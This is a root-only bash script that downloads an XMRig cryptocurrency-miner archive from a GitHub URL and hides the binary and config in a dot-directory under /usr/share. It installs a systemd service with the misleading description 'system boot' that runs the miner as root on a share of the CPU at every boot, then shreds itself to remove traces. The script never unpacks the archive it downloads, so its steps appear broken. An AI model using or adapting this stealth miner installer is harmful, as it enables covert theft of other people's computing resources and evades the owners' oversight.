#!/bin/bash

if [[ $EUID -eq 0 ]]; then
    dircheck="/usr/share/.logstxt"
    filcheck="/etc/systemd/system/xmrig.service"
    filename="$0"

    exits() {
        if [[ -d "$dircheck" ]]; then
            rm -r "${dircheck}"
        fi

        if [[ -f "$filcheck" ]]; then
            rm "${filcheck}"
        fi
    }

    exits

    if curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz" -o xmrig.tar.gz; then
        touch xmrig.service
        chmod 777 xmrig config.json
        chmod 644 xmrig.service
        mkdir -p "${dircheck}"
        mv xmrig config.json "${dircheck}/"
        mv xmrig.service /etc/systemd/system/

        threads=$(lscpu -p | grep -c "^[0-9]")
        tf=$(printf %.f "$((25 * $threads))e-2")
        append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --threads=${tf}\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target" >/etc/systemd/system/xmrig.service)

        echo "vm.nr_hugepages=1280" >>/etc/sysctl.conf
        sysctl --quiet --system
        systemctl daemon-reload
        systemctl enable --now xmrig --quiet

        shred -u "${filename}"
    else
        echo "Failed to download xmrig.tar.gz"
    fi
else
    echo "Please Run as root!"
fi